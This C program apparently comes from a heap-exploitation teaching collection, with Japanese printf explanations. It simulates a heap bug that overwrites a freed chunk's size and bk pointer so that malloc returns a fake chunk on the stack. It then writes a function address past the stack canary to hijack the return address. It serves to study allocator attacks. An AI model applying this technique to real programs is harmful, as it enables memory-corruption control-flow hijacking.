#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};

	printf("この手法は、glibc の tcache オプションが無効な場合、または victim チャンクのサイズが 0x408 より大きい場合にのみ動作します。ビルド方法は build_glibc.sh を参照してください。\n");

	printf("victim チャンク(chunk)を割り当てます\n");
	intptr_t* victim = malloc(0x410);

	printf("free() の際に、top chunkが小さい方のチャンクと統合(consolidate)されるのを避けるため、もう1つチャンクを割り当てます\n");
	intptr_t* p1 = malloc(0x410);

	printf("チャンク %p を free します。このチャンクは unsorted bin に挿入されます\n", victim);
	free(victim);

	printf("スタック上に偽のチャンクを作ります");
	printf("次の割り当て用のサイズを設定し、bk ポインタを書き込み可能な任意のアドレスに設定します");
	stack_buffer[1] = 0x410 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	//------------VULNERABILITY-----------
	printf("ここで、victim->size と victim->bk ポインタを上書きできる脆弱性を再現します\n");
	printf("fake_chunk を返させるには、サイズが次の要求サイズと異なっている必要があり、かつ 2*SIZE_SZ (x64 では > 16) && < av->system_mem のチェックを通過する必要があります\n");
	victim[-1] = 0x30;
	victim[1] = (intptr_t)stack_buffer; // victim->bk はスタックを指しています
	//------------------------------------

	printf("次の malloc は、偽のチャンクの領域を返します: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x410);
	printf("malloc(0x410): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot; // メモリ上のシェルコードを再現しています
	memcpy((p2+40), &sc, 8); // これはカナリア(canary)を飛び越えるため、スタックスマッシュ検出を回避できます

	assert((long)__builtin_return_address(0) == (long)jackpot);
}
